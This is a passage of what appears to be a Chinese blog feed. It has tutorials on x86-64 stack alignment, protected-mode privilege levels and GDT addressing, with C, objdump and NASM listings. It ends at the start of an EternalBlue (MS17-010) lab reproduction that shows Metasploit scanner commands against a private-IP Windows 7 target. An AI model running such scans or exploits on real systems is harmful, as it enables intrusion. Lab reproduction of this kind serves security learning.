a1;</span><br><span class="line">    *a2p += a2;</span><br><span class="line">    *a3p += a3;</span><br><span class="line">    *a4p += a4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">call_proc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>  x1 = <span class="number">1</span>; <span class="keyword">int</span>  x2 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">short</span> x3 = <span class="number">3</span>; <span class="keyword">char</span> x4 = <span class="number">4</span>;</span><br><span class="line">    proc(x1, &amp;x1, x2, &amp;x2, x3, &amp;x3, x4, x4);</span><br><span class="line">    <span class="keyword">return</span> (x1+x2)*(x3+x4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下命令进行编译和反编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -Og -fno-stack-protector -c call_proc.c</span><br><span class="line">$ objdump -d call_proc.o</span><br></pre></td></tr></table></figure><p>其中<code>-fno-stack-protector</code>参数指示编译器不添加栈保护者机制</p><p>生成的汇编代码如下，这里我们仅看<code>call_proc()</code>中的栈空间分配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0000000000000015 &lt;call_proc&gt;:</span><br><span class="line">  15:   48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">  19:   48 c7 44 24 08 01 00    movq   $0x1,0x8(%rsp)</span><br><span class="line">  20:   00 00 </span><br><span class="line">  22:   c7 44 24 04 02 00 00    movl   $0x2,0x4(%rsp)</span><br><span class="line">  29:   00 </span><br><span class="line">  2a:   66 c7 44 24 02 03 00    movw   $0x3,0x2(%rsp)</span><br><span class="line">  31:   c6 44 24 01 04          movb   $0x4,0x1(%rsp)</span><br><span class="line">  36:   48 8d 4c 24 04          lea    0x4(%rsp),%rcx</span><br><span class="line">  3b:   48 8d 74 24 08          lea    0x8(%rsp),%rsi</span><br><span class="line">  40:   48 8d 44 24 01          lea    0x1(%rsp),%rax</span><br><span class="line">  45:   50                      push   %rax</span><br><span class="line">  46:   6a 04                   pushq  $0x4</span><br><span class="line">  48:   4c 8d 4c 24 12          lea    0x12(%rsp),%r9</span><br><span class="line">  4d:   41 b8 03 00 00 00       mov    $0x3,%r8d</span><br><span class="line">  53:   ba 02 00 00 00          mov    $0x2,%edx</span><br><span class="line">  58:   bf 01 00 00 00          mov    $0x1,%edi</span><br><span class="line">  5d:   e8 00 00 00 00          callq  62 &lt;call_proc+0x4d&gt;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>15行（我们具体以代码中给出的行号，其实这些数字应该是指令的起始位置，姑且就这样叫吧）中先将%rsp减去0x10，为4个局部变量共分配了16个字节的空间，并且在45和46行，程序将%rax和$0x4入栈，联系该函数的C语言程序和汇编程序中的具体操作，不难知，栈上的具体空间分配如下图所示：</p><img src="/images/运行时栈的字节对齐2.png"><p>图中，为了使栈字节对齐，4单独占用了一个8字节的空间，并且栈中的每一个类型的变量，都符合数据对齐的要求。</p><p>如果我们的参数8占用的字节数减少，会不会减少栈空间的占用呢？我们将上面的C语言程序的稍微改一改，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc</span><span class="params">(<span class="keyword">long</span>  a1, <span class="keyword">long</span>  *a1p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">int</span>   a2, <span class="keyword">int</span>   *a2p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">short</span> a3, <span class="keyword">short</span> *a3p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">char</span>  a4, <span class="keyword">char</span> a5)</span> </span>&#123;  <span class="comment">// char *a4p改为了char a5</span></span><br><span class="line">    *a1p += a1;</span><br><span class="line">    *a2p += a2;</span><br><span class="line">    *a3p += a3;</span><br><span class="line">    a5 += a4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">call_proc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>  x1 = <span class="number">1</span>; <span class="keyword">int</span>  x2 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">short</span> x3 = <span class="number">3</span>; <span class="keyword">char</span> x4 = <span class="number">4</span>;</span><br><span class="line">    proc(x1, &amp;x1, x2, &amp;x2, x3, &amp;x3, x4, x4);  <span class="comment">// 相应的改变了最后一个参数</span></span><br><span class="line">    <span class="keyword">return</span> (x1+x2)*(x3+x4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>call_proc()</code>的汇编如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">000000000000000a &lt;call_proc&gt;:</span><br><span class="line">   a:   48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">   e:   48 c7 44 24 08 01 00    movq   $0x1,0x8(%rsp)</span><br><span class="line">  15:   00 00 </span><br><span class="line">  17:   c7 44 24 04 02 00 00    movl   $0x2,0x4(%rsp)</span><br><span class="line">  1e:   00 </span><br><span class="line">  1f:   66 c7 44 24 02 03 00    movw   $0x3,0x2(%rsp)</span><br><span class="line">  26:   48 8d 4c 24 04          lea    0x4(%rsp),%rcx</span><br><span class="line">  2b:   48 8d 74 24 08          lea    0x8(%rsp),%rsi</span><br><span class="line">  30:   6a 04                   pushq  $0x4</span><br><span class="line">  32:   6a 04                   pushq  $0x4</span><br><span class="line">  34:   4c 8d 4c 24 12          lea    0x12(%rsp),%r9</span><br><span class="line">  39:   41 b8 03 00 00 00       mov    $0x3,%r8d</span><br><span class="line">  3f:   ba 02 00 00 00          mov    $0x2,%edx</span><br><span class="line">  44:   bf 01 00 00 00          mov    $0x1,%edi</span><br><span class="line">  49:   e8 00 00 00 00          callq  4e &lt;call_proc+0x44&gt;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>对照程序，栈的空间结构编程的如下如所示：</p><img src="/images/运行时栈的字节对齐3.png"><p>我们发现，栈空间的占用并没有减少，为了能够达到栈字节对齐的目的，参数8和参数7各占一个8字节的空间，该过程调用浪费了1 + 7 + 7 = 15字节的空间。但为了兼容性和效率，这是值得的。</p><p>我们再看另一个程序，当我们在栈中分配字符串时又是怎样的呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">char</span> buffer1[<span class="number">5</span>];</span><br><span class="line">       <span class="keyword">char</span> buffer2[<span class="number">10</span>];</span><br><span class="line">       <span class="built_in">strcpy</span>(buffer2, buffer1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        function(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>使用<code>gcc -fno-stack-protector -o foo foo.c</code>和<code>objdump -d foo</code>进行编译和反编译后，<code>function()</code>的汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000064a &lt;function&gt;:</span><br><span class="line"> 64a:55                   push   %rbp</span><br><span class="line"> 64b:48 89 e5             mov    %rsp,%rbp</span><br><span class="line"> 64e:48 83 ec 20          sub    $0x20,%rsp</span><br><span class="line"> 652:89 7d ec             mov    %edi,-0x14(%rbp)</span><br><span class="line"> 655:89 75 e8             mov    %esi,-0x18(%rbp)</span><br><span class="line"> 658:89 55 e4             mov    %edx,-0x1c(%rbp)</span><br><span class="line"> 65b:48 8d 55 fb          lea    -0x5(%rbp),%rdx</span><br><span class="line"> 65f:48 8d 45 f1          lea    -0xf(%rbp),%rax</span><br><span class="line"> 663:48 89 d6             mov    %rdx,%rsi</span><br><span class="line"> 666:48 89 c7             mov    %rax,%rdi</span><br><span class="line"> 669:e8 b2 fe ff ff       callq  520 &lt;strcpy@plt&gt;</span><br><span class="line"> 66e:90                   nop</span><br><span class="line"> 66f:c9                   leaveq </span><br><span class="line"> 670:c3                   retq</span><br></pre></td></tr></table></figure><p>该过程共在栈上分配了32个字节的空间，其中包括两个字符串的空间和三个函数的参数的空间，这里需要提一下的是，尽管再x64下，函数的前6个参数直接用寄存器进行传递，但是有时候程序需要用到参数的地址，这个时候程序就不的不在栈上为参数分配内存并将参数拷贝到内存上，来满足程序对参数地址的操作。</p><p>联系程序，该过程的栈结构如下：</p><img src="/images/运行时栈的字节对齐4.png"><p>图中，因为char类型的地址可以从任意地址开始（地址为1的倍数），所以buffer1和buffer2是连续分配的，而三个int型变量则分配在了两个单独的8字节空间中。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上，我们看到，为了满足数据对齐和栈字节对齐的要求，或者说规范，编译器不惜牺牲了部分内存，这使得程序提高了兼容性，也提高了程序的性能。</p><hr><p>完</p><p>参考：</p><ul><li>《深入理解计算机系统》</li><li><a href="https://www.twblogs.net/a/5b8047b92b71772165a6bdd2/zh-cn" target="_blank" rel="noopener">C函数调用过程解析(x86-64)</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;C语言的过程调用机制（即函数之间的调用）的一个关键特性（起始大多数编程语言也是如此）都是使用了栈数据结构提供的后进先出的内存管理原则。每一个
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>保护模式特权级概述</title>
    <link href="https://mingliangliu.com/2019/08/10/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%89%B9%E6%9D%83%E7%BA%A7%E6%A6%82%E8%BF%B0/"/>
    <id>https://mingliangliu.com/2019/08/10/保护模式特权级概述/</id>
    <published>2019-08-10T07:04:53.000Z</published>
    <updated>2019-08-10T10:30:06.302Z</updated>
    
    <content type="html"><![CDATA[<p>在IA32的操作系统中，段被分为了4个特权级，分别为0-3级，有时候我们也叫做ring0-ring3，其中，数值越小特权级越高。如下图所示：</p><p><img src="/images/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%89%B9%E6%9D%83%E7%BA%A7%E6%A6%82%E8%BF%B01.jpg" alt></p><p>图中，核心代码和数据所在的段的特权级都比较高，一般在ring0，而用户程序所在的段的特权级较低，一般在ring3。当低特权级的任务试图在未被允许的情况下访问高特权级的段时，将会产生常规保护错误。</p><p>而处理器是如何区分所在段的特权级，进而对其进行保护的呢？这就不得不提到CPL、DPL和RPL三者了。但是在开始之前，我们需要先了解一下一致代码段和非一致代码段。</p><h2 id="一致代码段和非一致代码段"><a href="#一致代码段和非一致代码段" class="headerlink" title="一致代码段和非一致代码段"></a>一致代码段和非一致代码段</h2><p>在操作系统中，我们有些高特权级的代码是希望被低特权级的程序所访问的，比如一些库函数，于是我们将这些高特权级代码放在一个叫做一致代码段的段里。而有些高特权级的代码，我们并不想让低特权级的程序所访问，于是我们把他们放在一个叫做非一致代码段的段里。具体来说，当通过call或者jmp指令转移到其它段时（即访问其他段），当转移的目标是一个优先级更高的一致代码段时，我们是可以进行访问的，但是当前的特权级会被延续下去；当转移的目标是一个优先级更高的非一致代码段时，这时的访问会引起常规保护错误（除非使用调用门或任务门）。</p><p>总结来说：</p><ul><li><p>一致代码段：由系统（高特权级）共享给低特权级的程序的代码所在的段，主要有下面两点限制：</p><ol><li>高特权级程序不能访问低特权级的数据</li><li>低特权级的程序可以访问高特权级的代码，但是<strong>特权级不会改变</strong>，还是保持低特权级程序的特权级</li></ol></li><li><p>非一致代码段：为了避免被低特权级程序所访问而保护起来的代码段，主要有一点限制：</p><ol><li>只允许同级之间访问</li></ol></li><li><p>另外，数据段都是非一致的 </p></li></ul><p>所遵循的规则如下图所示：</p><p><img src="/images/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%89%B9%E6%9D%83%E7%BA%A7%E6%A6%82%E8%BF%B02.jpg" alt></p><h2 id="CPL"><a href="#CPL" class="headerlink" title="CPL"></a>CPL</h2><p>CPL全称Current Privilege Level，顾名思义，CPL代表的是当前执行的任务和程序的特权级。它存储在cs和ss的第0位和第1位上。<strong>一般情况下</strong>，CPL等于代码所在段的特权级，当程序转移到不同的代码段时，处理器将改变CPL的值。</p><p>但是当访问一致代码段时，并不会改变CPL，正如一致代码段中所说，一致代码段可以被低特权级的程序所访问，但是并不会改变特权级，所以也就不会改变CPL，这就是与上面加粗的“一般情况”相对的“非一般情况”。</p><h2 id="DPL"><a href="#DPL" class="headerlink" title="DPL"></a>DPL</h2><p>DPL全程为Descriptor Privilege Level，它代表段或者门的特权级。他被存储在段描述符或者门描述符属性中的DPL字段上。</p><p>当当前的代码段试图访问一个段或者门时，DPL将会和CPL以及段或者门选择子的RPL相比较，而对于段或者门类型的不同，比较规则也不同，具体如下：</p><ul><li>数据段：如果访问的是一个数据段，DPL代表访问此段的最低特权级，即只有CPL &lt;= DPL（数值上），才有权限访问。</li><li>非一致代码段（不使用调用门）：DPL代表访问此段的特权级。即只有DPL = RPL，才有权限访问。</li><li>调用门：DPL规定了当前执行的任务和程序可以访问此调用门的最低特权级，即要CPL &lt;= DPL</li><li>一致代码段和非一致代码段（使用调用门访问）：DPL规定了访问此段的最高特权级。即只有CPL &gt;= DPL，才有权限访问。</li><li>TSS：DPL规定了访问此TSS的最低特权级。</li></ul><p>总结一下就是：</p><ul><li>在 数据段、调用门、TSS中，DPL代表最低特权级，访问要求：CPL &lt;= DPL</li><li>在 不使用调用门访问的非一直代码段时，访问要求： CPL = DPL</li><li>在 一致代码段和使用调用门访问的非一致代码段中，DPL 代表最高特权级，访问要求：CPL &gt;= DPL</li></ul><h2 id="RPL"><a href="#RPL" class="headerlink" title="RPL"></a>RPL</h2><p>RPL全称是Requested Privilege Level。RPL保存在段选择子的第0位和第1位上。我们在上文说了当一个段访问另一个段时，CPL与DPL的比较规则，但是仅仅比较CPL和DPL是不够的，处理器还要通过检查RPL来确定能否访问另一个段。</p><p>操作系统往往用RPL来避免低特权级应用程序访问高特权级段内的数据，即便提出访问请求的段有足够的特权级，如果RPL不够也是不行的，当RPL的值比CPL大的时候，RPL将起决定性作用。也就是说，只有当CPL和RPL都小于要访问的数据段的DPL时，才有权限访问该数据段。关于为什么引入RPL的讨论还是比较复杂的，此处不再深入探讨。</p><hr><p>完</p><p>参考：</p><ul><li>《一个操作系统的实现》 于渊</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在IA32的操作系统中，段被分为了4个特权级，分别为0-3级，有时候我们也叫做ring0-ring3，其中，数值越小特权级越高。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%8
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="保护模式" scheme="https://mingliangliu.com/tags/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>保护模式下的寻址</title>
    <link href="https://mingliangliu.com/2019/08/04/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%AF%BB%E5%9D%80/"/>
    <id>https://mingliangliu.com/2019/08/04/保护模式下的寻址/</id>
    <published>2019-08-04T12:20:03.000Z</published>
    <updated>2019-08-10T07:03:22.874Z</updated>
    
    <content type="html"><![CDATA[<p>在汇编语言中，或者你有学习过诸如微机原理或计算机组成原理等课程的话，那么你很可能听说过实模式和保护模式的概念。他们到底是什么，有什么不同，又如何寻址？</p><p>在王爽的《汇编语言》最后，有关于Intel微处理器的三种工作模式的介绍。</p><p>继Intel 8086推出之后，Intel又推出了划时代的80386微处理器，它可以在实模式、保护模式和虚拟8086模式下工作，从那以后的微处理器都提供了这三种工作模式，直到现在。Intel系列微处理器的三种工作模式如下：</p><ul><li>实模式：工作模式相当于一个8086</li><li>保护模式：提供支持多任务环境的工作方式，建立保护机制</li><li>虚拟8086模式：可以从保护模式切换至其中的一种8086工作方式，这种方式的提供使用户可以方便的在保护模式下运行一个或多个8086程序</li></ul><p>当我们的系统开机时，cpu首先工作在实模式下完成一些工作，之后跳入保护模式，为我们的系统提供多任务环境的支持。而当我们需要在保护模式的系统上运行实模式下的程序时（比如学习汇编时所用的DOS系统），我们就需要在当前的保护模式下弄一个“假”的实模式，这就是虚拟8086模式。</p><h2 id="GDT和描述符"><a href="#GDT和描述符" class="headerlink" title="GDT和描述符"></a>GDT和描述符</h2><p>在实模式下（可以理解为工作在8086上时），我们的CPU是16位的，提供了16位的寄存器，16位数据总线，20位的地址总线，可寻址范围位1M。物理地址遵循下面的计算公式：</p><p>$$<br>物理地址 = 段地址 * 16 + 偏移地址<br>$$</p><p>其中的段地址和偏移地址都是16位的。</p><p>从80386开始，Intel家族的CPU进入了32位时代，这时候CPU有32位的地址总线，所以可寻址范围为4G。CPU同样拥有的是32位的寄存器，一个寄存器即可寻址4GB的空间。</p><p>在实模式下，我们采用<strong>段地址:偏移地址</strong>的寻址方式是因为我们只有16为的寄存器，单个寄存器的寻址范围达不到1MB，但现在我们拥有了32位的寄存器，单个寄存器的可寻址范围已经可以达到4GB了，那么是不是就不需要段寄存器了？答案是否定的。在保护模式下，地址仍然采用“段地址:偏移地址”的方式来表示，只是<strong>段的概念发生了根本性的变化</strong>。</p><p>实模式下，段值（段地址的值）还是地址的一部分。在保护模式下，虽然段值仍然由原来的<strong>16位</strong>的cs、ds等寄存器表示，但是此时它们仅仅是一个索引，这些个索引<strong>指向一个数据结构的表项</strong>，表项中详细定义了一个段的起始地址、界限、属性等内容，这个数据结构，叫做<strong>GDT</strong>（其实还可能是LDT，我们先讨论大多数情况），GDT中的每一个表项，叫做<strong>描述符</strong></p><h2 id="寻址过程"><a href="#寻址过程" class="headerlink" title="寻址过程"></a>寻址过程</h2><p>我们在来看一下保护模式下的寻址过程。在此之前，有几点要说明：</p><ul><li>GDT是一个数据结构，它是保存在内存中的，所以它应该有一个起始地址，它是一系列描述符的集合</li><li>GDT的起始地址由一个专门的寄存器来存放 – gdtr，gdtr寄存器是48位的，这个寄存器我们稍后在探讨</li><li>GDT中的每一个描述符描述一个段，其中包括段的起始地址（基址）等属性</li><li>保护模式的偏移地址和实模式下的是相同的，只不过是32位</li></ul><p>好了，下面有一张图，我们可以看着这张图过一遍保护模式下是如何寻址的。</p><img src="/images/保护模式的寻址1.jpg"><ol><li>寻址时，先找到gdtr寄存器，从中得到GDT的基址</li><li>有了GDT的基址，又有段寄存器中保存的索引，可以得到段寄存器“所指”的那个表项，既所指的那个描述符</li><li>得到了描述符，就可以从描述符中得到该描述符所描述的那个段的起始地址</li><li>有了段的起始地址，将偏移地址拿过来与之相加，便能得到最后的<strong>线性地址</strong></li><li>有了线性地址（虚拟地址），经过变换，即可得到相应的物理地址</li></ol><p>相信到这里，你已经对寻址过程有了个大概的了解，然后我们看看我们上面所未详细提及的东西</p><h2 id="gdtr寄存器"><a href="#gdtr寄存器" class="headerlink" title="gdtr寄存器"></a>gdtr寄存器</h2><p>gdtr是一个48位的寄存器，其中保存了GDT的基地址和界限（或者说GDT的长度），高32位为GDT的基地址，低16位为界限。还记得保护模式中的段寄存器也是16位的吗，它们和gdtr中的界限是对应的啊。</p><img src="/images/保护模式下的寻址4.jpg" title="title gdtr寄存器"><h2 id="描述符"><a href="#描述符" class="headerlink" title="描述符"></a>描述符</h2><p>GDT中的每个描述符占8个字节，其结构如下</p><img src="/images/保护模式下的寻址2.jpg"><p>我们可以不用管其中的属性，仅看段基址和段界限。是不是和上面的寻址联系上了呢。</p><p>你可能会问，问什么段基址和段界限都被分开了，却不放在一起？这主要还是历史遗留问题，我们就不在探讨了。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>光看理论终究还是水中月，我们看一段简单的代码实际体会一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[SECTION .gdt]</span><br><span class="line">; GDT</span><br><span class="line">;                              段基址,       段界限     , 属性</span><br><span class="line">LABEL_GDT:   Descriptor       0,                0, 0           ; 空描述符</span><br><span class="line">LABEL_DESC_CODE32: Descriptor       0, SegCode32Len - 1, DA_C + DA_32; 非一致代码段</span><br><span class="line">LABEL_DESC_VIDEO:  Descriptor 0B8000h,           0ffffh, DA_DRW     ; 显存首地址</span><br><span class="line">; GDT 结束</span><br><span class="line"></span><br><span class="line">GdtLenequ$ - LABEL_GDT; GDT长度</span><br><span class="line">GdtPtrdwGdtLen - 1; GDT界限</span><br><span class="line">dd0; GDT基地址</span><br><span class="line"></span><br><span class="line">; GDT 选择子</span><br><span class="line">SelectorCode32equLABEL_DESC_CODE32- LABEL_GDT</span><br><span class="line">SelectorVideoequLABEL_DESC_VIDEO- LABEL_GDT</span><br></pre></td></tr></table></figure><p>上面的代码中，我们定义了一个角.gdt的段，其中前三个LABLE_xxx后是我们用一个叫Descriptor宏定义了三个选择子，其中的数值并不一定正确，因为我们只是定义了，还<strong>并没有初始化</strong>。 Descriptor的作用是将段基址、段界限和属性放在一个选择子中相应的位置，其定义在文章末尾，感兴趣的话可以看下。</p><p><code>GdtPtr</code>是不是和gdtr中所放的内容一样呢？没错，当我们在实模式进入保护模式之前，我们需要将GdtPtr的值加载到gdtr寄存器：使用指令<code>lgdt [GdtPtr]</code></p><p>那最后两个GDT选择子又是什么呢？好像是描述符相对于GDT基地址的偏移，其实并不全对，它稍稍复杂一些，如下图所示。</p><img src="/images/保护模式下的寻址3.jpg"><p>其中TI和RPL是选择子的一些属性，剩下的高13位表示的是描述符在描述符表的位置，即GDT中<strong>第几个</strong>描述符</p><p>最后，我们看一下如何使用上面的东西吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[SECTION .s32]; 32 位代码段. </span><br><span class="line">[BITS32]</span><br><span class="line"></span><br><span class="line">LABEL_SEG_CODE32:</span><br><span class="line">movax, SelectorVideo</span><br><span class="line">movgs, ax; 视频段选择子(目的)</span><br><span class="line"></span><br><span class="line">movedi, (80 * 11 + 79) * 2; 屏幕第 11 行, 第 79 列。</span><br><span class="line">movah, 0Ch; 0000: 黑底    1100: 红字</span><br><span class="line">moval, &apos;P&apos;</span><br><span class="line">mov[gs:edi], ax</span><br><span class="line"></span><br><span class="line">; 到此停止</span><br><span class="line">jmp$</span><br><span class="line"></span><br><span class="line">SegCode32Lenequ$ - LABEL_SEG_CODE32</span><br></pre></td></tr></table></figure><p>上述代码将一个字母P显示在屏幕上。gs中保存的是显存的选择子，edi为偏移地址，然后使用<code>mov    [gs:edi], ax</code>将ax的内容写入到地址为<strong>gs所指的描述符中的段基址+edi</strong>的内存处，由于这里写入的是显存，所以将会将一个字母P显示在屏幕上。</p><p>Descriptor宏的定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; usage: Descriptor Base, Limit, Attr</span><br><span class="line">;        Base:  dd</span><br><span class="line">;        Limit: dd (low 20 bits available)</span><br><span class="line">;        Attr:  dw (lower 4 bits of higher byte are always 0)</span><br><span class="line">%macro Descriptor 3</span><br><span class="line">dw%2 &amp; 0FFFFh; 段界限1</span><br><span class="line">dw%1 &amp; 0FFFFh; 段基址1</span><br><span class="line">db(%1 &gt;&gt; 16) &amp; 0FFh; 段基址2</span><br><span class="line">dw((%2 &gt;&gt; 8) &amp; 0F00h) | (%3 &amp; 0F0FFh); 属性1 + 段界限2 + 属性2</span><br><span class="line">db(%1 &gt;&gt; 24) &amp; 0FFh; 段基址3</span><br><span class="line">%endmacro ; 共 8 字节</span><br></pre></td></tr></table></figure><hr><p>完</p><p>参考：</p><ul><li>《汇编语言》 王爽</li><li>《一个操作系统的实现》 于渊</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在汇编语言中，或者你有学习过诸如微机原理或计算机组成原理等课程的话，那么你很可能听说过实模式和保护模式的概念。他们到底是什么，有什么不同，又如何寻址？&lt;/p&gt;
&lt;p&gt;在王爽的《汇编语言》最后，有关于Intel微处理器的三种工作模式的介绍。&lt;/p&gt;
&lt;p&gt;继Intel 808
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="保护模式" scheme="https://mingliangliu.com/tags/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>永恒之蓝漏洞复现</title>
    <link href="https://mingliangliu.com/2019/08/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://mingliangliu.com/2019/08/04/永恒之蓝漏洞复现/</id>
    <published>2019-08-04T09:07:47.000Z</published>
    <updated>2019-08-04T16:31:45.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。</p><h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><ul><li>Kali Linux (IP: 192.168.190.135)</li><li>Metasploit工具</li><li>靶机，MSDN下载的win7  (IP: 192.168.190.136)</li></ul><p>win7中开启文件共享</p><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>先启动msfconsole，输入如下指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS 